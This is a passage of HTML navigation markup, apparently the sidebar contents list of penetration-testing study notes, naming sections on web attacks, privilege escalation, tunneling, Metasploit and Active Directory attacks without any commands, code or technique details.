      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nse-vulnerability-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      
        NSE Vulnerability Scripts
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introduction to Web Application Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Web Application Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-application-assessment-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Web Application Assessment Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-application-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Web Application Enumeration
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cross-Site Scripting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#common-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Common Web Application Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Common Web Application Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory-traversal" class="md-nav__link">
    <span class="md-ellipsis">
      
        Directory Traversal
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-inclusion-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        File Inclusion Vulnerabilities
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Inclusion Vulnerabilities">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-file-inclusion-lfi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Local File Inclusion (LFI)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-wrappers" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP Wrappers
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-inclusion-rfi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Remote File Inclusion (RFI)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-upload-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        File Upload Vulnerabilities
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Upload Vulnerabilities">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-executable-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Executable Files
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-non-executable-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Non-Executable Files
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Command Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Injection Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Injection Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-theory-and-databases" class="md-nav__link">
    <span class="md-ellipsis">
      
        SQL Theory and Databases
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Theory and Databases">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#db-types-and-characteristics" class="md-nav__link">
    <span class="md-ellipsis">
      
        DB Types and Characteristics
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-sql-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual SQL Exploitation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual SQL Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#error-based-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        Error-based Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#union-based-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        UNION-based Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#blind-sql-injections" class="md-nav__link">
    <span class="md-ellipsis">
      
        Blind SQL Injections
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-and-automated-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual and Automated Code Execution
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual and Automated Code Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual Code Execution
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-the-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating the Attack
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#client-side-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Client-side Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Client-side Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#target-reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      
        Target Reconnaissance
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Target Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#information-gathering_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information Gathering
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#client-fingerprinting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Client Fingerprinting
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-microsoft-office" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exploiting Microsoft Office
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting Microsoft Office">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#preparing-the-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        Preparing the Attack
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leveraging-microsoft-word-macros" class="md-nav__link">
    <span class="md-ellipsis">
      
        Leveraging Microsoft Word Macros
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-windows-library-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Abusing Windows Library Files
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abusing Windows Library Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obtaining-code-execution-via-windows-library-files" class="md-nav__link">
    <span class="md-ellipsis">
      
        Obtaining Code Execution via Windows Library Files
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#locating-public-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Locating Public Exploits
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fixing-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fixing Exploits
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fixing Exploits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fixing-memory-corruption-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fixing Memory Corruption Exploits
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Fixing Memory Corruption Exploits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#buffer-overflow-in-a-nutshell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Buffer Overflow in a Nutshell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cross-compiling-exploit-code" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cross-Compiling Exploit Code
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phishing-basics" class="md-nav__link">
    <span class="md-ellipsis">
      
        Phishing Basics
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phishing Basics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#payloads-misdirection-and-speedbumps" class="md-nav__link">
    <span class="md-ellipsis">
      
        Payloads, Misdirection, and Speedbumps
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hands-on-credential-phishing" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hands-On Credential Phishing
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Attacks
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attacking-network-services-logins" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attacking Network Services Logins
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-cracking-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Cracking Fundamentals
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Password Cracking Fundamentals">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#introduction-to-encryption-hashes-and-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introduction to Encryption, Hashes and Cracking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mutating-wordlists" class="md-nav__link">
    <span class="md-ellipsis">
      
        Mutating Wordlists
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-manager" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Manager
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-private-key-passphrase" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Private Key Passphrase
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#working-with-password-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      
        Working with Password Hashes
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Working with Password Hashes">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ntlm-netntlmv2" class="md-nav__link">
    <span class="md-ellipsis">
      
        NTLM / NetNTLMv2
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-credential-guard" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Credential Guard
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#antivirus-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Antivirus Evasion
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Antivirus Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-antivirus-detections" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bypassing Antivirus Detections
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bypassing Antivirus Detections">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#on-disk-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        On-Disk Evasion
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in-memory-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        In-Memory Evasion
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#av-evasion-in-practice" class="md-nav__link">
    <span class="md-ellipsis">
      
        AV Evasion in Practice
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AV Evasion in Practice">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#testing-for-av-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Testing for AV Evasion
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-evasion-custom-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Evasion - Custom Binaries
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-evasion-memory-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Evasion - Memory Injection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-the-process" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating the Process
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Privilege Escalation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-windows" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Windows
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating Windows">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#understanding-windows-privileges-and-access-control-mechanisms" class="md-nav__link">
    <span class="md-ellipsis">
      
        Understanding Windows Privileges and Access Control Mechanisms
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#situational-awareness" class="md-nav__link">
    <span class="md-ellipsis">
      
        Situational Awareness
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hidden-in-plain-view" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hidden in Plain View
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#information-goldmine-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Information Goldmine PowerShell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automated-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automated Enumeration
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leveraging-windows-services" class="md-nav__link">
    <span class="md-ellipsis">
      
        Leveraging Windows Services
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Leveraging Windows Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#service-binary-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      
        Service Binary Hijacking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      
        DLL Hijacking
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unquoted-service-paths" class="md-nav__link">
    <span class="md-ellipsis">
      
        Unquoted Service Paths
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-other-windows-components" class="md-nav__link">
    <span class="md-ellipsis">
      
        Abusing Other Windows Components
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abusing Other Windows Components">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#scheduled-tasks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Scheduled Tasks
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-exploits" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Exploits
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux-privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Privilege Escalation
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-linux" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Linux
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exposed-confidential-information" class="md-nav__link">
    <span class="md-ellipsis">
      
        Exposed Confidential Information
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-file-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Insecure File Permissions
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#insecure-system-components" class="md-nav__link">
    <span class="md-ellipsis">
      
        Insecure System Components
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-redirection-and-ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Redirection and SSH Tunneling
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Redirection and SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-linux-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Linux Tools
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding with Linux Tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-socat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Socat
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunneling" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Tunneling
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SSH Tunneling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ssh-local-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Local Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Dynamic Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Remote Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-remote-dynamic-port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSH Remote Dynamic Port Forwarding
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-sshuttle" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using sshuttle
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding-with-windows-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Port Forwarding with Windows Tools
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port Forwarding with Windows Tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sshexe" class="md-nav__link">
    <span class="md-ellipsis">
      
        ssh.exe
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#plink" class="md-nav__link">
    <span class="md-ellipsis">
      
        Plink
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netsh" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netsh
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tunneling-through-deep-packet-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tunneling Through Deep Packet Inspection
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tunneling Through Deep Packet Inspection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#http-tunneling-with-chisel" class="md-nav__link">
    <span class="md-ellipsis">
      
        HTTP Tunneling with Chisel
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#http-tunneling-with-lilogo-ng" class="md-nav__link">
    <span class="md-ellipsis">
      
        HTTP Tunneling with Lilogo-NG
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-tunneling-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      
        DNS Tunneling Fundamentals
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-tunneling-with-dnscat2" class="md-nav__link">
    <span class="md-ellipsis">
      
        DNS Tunneling with dnscat2
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#the-metasploit-framework" class="md-nav__link">
    <span class="md-ellipsis">
      
        The Metasploit Framework
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="The Metasploit Framework">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#getting-familiar-with-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting Familiar with Metasploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-metasploit-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      
        Using Metasploit Payloads
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#performing-post-exploitation-with-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Performing Post-Exploitation with Metasploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#automating-metasploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        Automating Metasploit
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-introduction-and-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Introduction and Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Introduction and Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-manual-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Manual Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory - Manual Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration-using-legacy-windows-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Enumeration Using Legacy Windows Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-active-directory-using-powershell-and-net-classes" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Active Directory using PowerShell and .NET Classes
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adding-search-functionality-to-our-script" class="md-nav__link">
    <span class="md-ellipsis">
      
        Adding Search Functionality to our Script
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ad-enumeration-with-powerview" class="md-nav__link">
    <span class="md-ellipsis">
      
        AD Enumeration with PowerView
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-enumeration-expanding-our-repertoire" class="md-nav__link">
    <span class="md-ellipsis">
      
        Manual Enumeration - Expanding our Repertoire
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual Enumeration - Expanding our Repertoire">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-operating-systems" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Operating Systems
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getting-an-overview-permissions-and-logged-on-users" class="md-nav__link">
    <span class="md-ellipsis">
      
        Getting an Overview - Permissions and Logged on Users
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration-through-service-principal-names" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumeration Through Service Principal Names
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-object-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Object Permissions
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-domain-shares" class="md-nav__link">
    <span class="md-ellipsis">
      
        Enumerating Domain Shares
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-automated-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory - Automated Enumeration
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory - Automated Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#collecting-data-with-sharphound" class="md-nav__link">
    <span class="md-ellipsis">
      
        Collecting Data with SharpHound
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#analysing-data-using-bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      
        Analysing Data using BloodHound
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacking-active-directory-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attacking Active Directory Authentication
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Active Directory Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ntlm-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        NTLM Authentication
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Kerberos Authentication
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cached-ad-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Cached AD Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#performing-attacks-on-active-directory-authentication" class="md-nav__link">
    <span class="md-ellipsis">
      
        Performing Attacks on Active Directory Authentication
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Performing Attacks on Active Directory Authentication">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-attacks_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Password Attacks
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        AS-REP Roasting
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      
        Kerberoasting
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      
        Silver Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-controller-synchronization-dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      
        Domain Controller Synchronization - DCsync
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nopac-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        NoPac Exploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#zerologon-exploit-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        ZeroLogon Exploit Exploit
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dfscoerce-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      
        DFSCoerce Exploit
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement-in-active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      
        Lateral Movement in Active Directory
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lateral Movement in Active Directory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#active-directory-lateral-movement-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Lateral Movement Techniques
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Lateral Movement Techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-and-winrm" class="md-nav__link">
    <span class="md-ellipsis">
      
        WMI and WinRM
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    <span class="md-ellipsis">
      
        PsExec
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pass the Hash
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overpass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      
        Overpass the Hash
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pass the Ticket
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcom" class="md-nav__link">
    <span class="md-ellipsis">
      
        DCOM
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-persistence" class="md-nav__link">
    <span class="md-ellipsis">
      
        Active Directory Persistence
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
